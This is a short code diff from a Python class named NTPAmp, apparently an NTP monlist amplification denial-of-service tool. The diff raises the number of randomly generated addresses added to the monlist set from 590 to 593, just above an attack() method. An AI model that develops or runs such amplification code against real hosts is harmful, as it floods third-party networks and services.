@@ -108,7 +108,7 @@ class NTPAmp(object):
         # for r in range(2, 255):
         #     self.add_monlist(target.format(r), random.randint(2000, 65535))
         gen = self.generate_randomip()
-        for i in range(590):
+        for i in range(593):
             self.add_monlist(gen.next(), random.randint(2000, 65535))
 
     def attack(self):
